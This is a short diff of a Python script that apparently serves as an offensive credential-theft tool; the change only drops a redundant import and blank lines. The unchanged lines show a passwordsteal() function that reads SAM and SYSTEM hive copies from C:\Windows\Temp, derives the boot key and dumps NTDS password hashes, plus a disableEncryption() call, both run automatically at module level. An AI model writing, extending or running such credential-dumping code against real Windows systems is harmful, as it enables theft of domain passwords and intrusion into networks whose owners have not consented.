@@ -1,5 +1,4 @@
 import subprocess
-from framework import readNTDS
 from framework.readNTDS import NTDSHashes
 from framework import samdumpy2
 
@@ -37,8 +36,6 @@ def passwordsteal():
     bootkey = samdumpy2.getsyskey("C:\\Windows\\Temp\\SAM C:\\Windows\\Temp\\SYSTEM")
     secretdata = NTDSHashes(ntdsfile, bootkey)
     secretdata.dump()
-
-
 
 disableEncryption()
 passwordsteal()
